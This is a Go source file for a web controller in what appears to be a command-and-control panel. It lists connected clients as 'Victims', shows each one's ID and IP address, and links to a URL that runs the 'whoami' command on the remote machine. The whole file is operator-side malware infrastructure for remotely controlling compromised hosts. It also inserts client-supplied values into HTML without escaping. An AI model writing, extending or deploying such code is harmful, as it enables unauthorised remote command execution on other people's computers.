package controllers

import (
	"fmt"
	"github.com/labstack/echo/v4"
	"net/http"
	"schrader/server/pkg/websocket"
)

func ClientsStatus(pool *websocket.Pool) func(c echo.Context) error {
	return func(c echo.Context) error {
		c.HTML(http.StatusOK, fmt.Sprintf("<h1>%d Victims</h1>", len(pool.Clients)))
		for client, _ := range pool.Clients {
			html := getDetails(client)
			c.HTML(http.StatusOK, html)
		}

		return nil
	}
}

// GetDetails returns the details of a client as a html string
func getDetails(client *websocket.Client) string {
	html := "<style> div { border: 1px solid black; padding: 10px; } </style>"
	html += "<div>"
	html += "<h2>" + client.ID + "</h2>"
	html += "<p>" + client.Conn.RemoteAddr().String() + "</p>"
	html += "<a href='/client/" + client.ID + "?cmd=whoami' target='_blank'><code>whoami</code></a></br>"
	html += "</div>"
	html += "<hr>"
	return html
}
